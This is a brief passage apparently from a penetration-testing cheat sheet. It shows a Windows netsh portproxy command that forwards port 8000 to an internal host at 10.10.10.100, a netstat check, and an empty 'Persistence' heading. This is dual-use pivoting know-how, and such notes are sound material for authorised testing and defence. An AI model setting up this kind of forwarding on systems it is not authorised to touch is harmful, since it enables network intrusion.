C:\WINDOWS\system32> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8000 connectaddress=10.10.10.100 connectport=80
C:\WINDOWS\system32> netstat -nato | findstr :8000
TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING 252 InHost
```

## Persistence

